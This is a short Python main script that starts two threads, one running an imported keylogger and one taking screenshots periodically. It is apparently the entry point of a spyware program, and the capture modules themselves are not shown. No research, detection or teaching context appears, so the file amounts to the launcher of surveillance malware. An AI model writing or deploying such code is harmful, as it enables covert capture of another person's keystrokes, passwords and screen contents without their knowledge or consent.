from keylogger import start_keylogger
from screenshot import capture_screenshot_periodically
import threading

if __name__ == "__main__":
    threading.Thread(target=start_keylogger).start()
    threading.Thread(target=capture_screenshot_periodically).start()
